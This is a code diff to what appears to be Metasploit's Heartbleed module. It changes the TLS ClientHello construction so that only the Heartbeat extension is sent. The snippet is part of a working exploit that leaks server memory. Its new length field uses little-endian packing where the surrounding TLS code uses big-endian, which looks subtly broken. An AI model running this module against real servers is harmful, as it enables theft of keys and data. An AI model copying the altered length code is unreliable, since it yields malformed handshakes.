@@ -247,18 +247,13 @@ class Metasploit3 < Msf::Auxiliary
     hello_data << CIPHER_SUITES.pack("n*") # Cipher Suites
     hello_data << "\x01"                   # Compression methods length (1)
     hello_data << "\x00"                   # Compression methods: null
-    hello_data << "\x00\x49"               # Extensions length (73)
-    hello_data << "\x00\x0b"               # Extension type (ec_point_formats)
-    hello_data << "\x00\x04"               # Extension length
-    hello_data << "\x03\x00\x01\x02"       # Extension data
-    hello_data << "\x00\x0a"               # Extension type (elliptic curves)
-    hello_data << "\x00\x34"               # Extension length
-    hello_data << "\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11" # Extension data
-    hello_data << "\x00\x23"               # Extension type (Sessionticket TLS)
-    hello_data << "\x00\x00"               # Extension length
-    hello_data << "\x00\x0f"               # Extension type (Heartbeat)
-    hello_data << "\x00\x01"               # Extension length
-    hello_data << "\x01"                   # Extension data
+
+    hello_data_extensions = "\x00\x0f"               # Extension type (Heartbeat)
+    hello_data_extensions << "\x00\x01"               # Extension length
+    hello_data_extensions << "\x01"                   # Extension data
+
+    hello_data << [hello_data_extensions.length].pack("v")
+    hello_data << hello_data_extensions
 
     data = "\x01\x00"                      # Handshake Type: Client Hello (1)
     data << [hello_data.length].pack("n")  # Length
